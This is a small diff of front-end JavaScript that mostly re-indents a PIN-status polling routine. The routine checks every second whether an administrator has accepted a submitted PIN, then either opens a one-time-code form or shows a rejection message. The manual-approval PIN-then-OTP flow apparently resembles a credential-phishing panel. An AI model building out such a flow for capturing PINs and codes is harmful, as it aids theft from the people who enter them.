@@ -343,22 +343,22 @@ document.addEventListener('DOMContentLoaded', function () {
                   if (submitBtn) submitBtn.disabled = false;
                   var firstOtp = otpForm ? otpForm.querySelector('.pin-box') : null;
                   if (firstOtp) firstOtp.focus();
-                } else {
-                  if (spinner) spinner.style.display = 'none';
-                  showToast('Your PIN was rejected by the administrator.', 'error');
-                  if (submitBtn) submitBtn.disabled = false;
-                  pinBoxes.forEach(function (box) { box.disabled = false; });
+                  } else {
+                    if (spinner) spinner.style.display = 'none';
+                    showToast('Your PIN was rejected by the administrator.', 'error');
+                    if (submitBtn) submitBtn.disabled = false;
+                    pinBoxes.forEach(function (box) { box.disabled = false; });
+                  }
                 }
-              }
-            })
-            .catch(function () {
-              if (spinner) spinner.style.display = 'none';
-              showToast('Error checking status. Please try again.', 'error');
-            })
-            .finally(function () {
-              checkingPinStatus = false;
-            });
-        };
+              })
+              .catch(function () {
+                if (spinner) spinner.style.display = 'none';
+                showToast('Error checking status. Please try again.', 'error');
+              })
+              .finally(function () {
+                checkingPinStatus = false;
+              });
+          };
         checkPinStatus();
         pollInterval = setInterval(checkPinStatus, 1000);
       })
